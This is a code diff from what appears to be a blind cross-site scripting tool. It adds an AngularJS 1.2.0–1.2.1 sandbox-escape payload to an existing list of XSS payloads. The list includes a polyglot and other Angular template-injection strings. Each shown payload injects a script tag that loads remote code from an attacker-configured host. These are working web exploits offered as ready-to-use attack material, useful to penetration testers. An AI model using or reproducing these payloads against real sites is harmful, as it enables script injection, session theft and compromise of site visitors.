@@ -16,6 +16,7 @@ exports.generatePayloads = (config) => {
     { description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload', payload: `"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")//>` },
     { description: 'Mario Heiderch - Angular Payload', payload: `{{constructor.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}} ` },
     { description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload', payload: `{{$on.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}}` },
+    { description: 'Jan Horn - 1.2.0 - 1.2.1 AngularJS Payload', payload: `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,"var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")()}}`},
   ];
   const structured = buildPayloadStructure(payloads);
 
